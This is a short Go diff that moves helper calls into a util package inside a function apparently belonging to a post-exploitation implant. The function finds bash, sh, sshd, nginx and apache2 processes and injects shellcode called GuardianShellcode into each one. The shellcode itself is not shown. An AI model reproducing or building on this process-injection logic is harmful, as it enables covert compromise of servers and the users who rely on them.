@@ -204,11 +204,11 @@ func injector() (err error) {
 	}
 
 	// find some processes to inject
-	procs := PidOf("bash")
-	procs = append(procs, PidOf("sh")...)
-	procs = append(procs, PidOf("sshd")...)
-	procs = append(procs, PidOf("nginx")...)
-	procs = append(procs, PidOf("apache2")...)
+	procs := util.PidOf("bash")
+	procs = append(procs, util.PidOf("sh")...)
+	procs = append(procs, util.PidOf("sshd")...)
+	procs = append(procs, util.PidOf("nginx")...)
+	procs = append(procs, util.PidOf("apache2")...)
 
 	// inject to all of them
 	for _, pid := range procs {
@@ -216,7 +216,7 @@ func injector() (err error) {
 			if pid == 0 {
 				return
 			}
-			log.Printf("Injecting to %s (%d)...", ProcCmdline(pid), pid)
+			log.Printf("Injecting to %s (%d)...", util.ProcCmdline(pid), pid)
 			e := Injector(&GuardianShellcode, pid)
 			if e != nil {
 				err = fmt.Errorf("%v, %v", err, e)
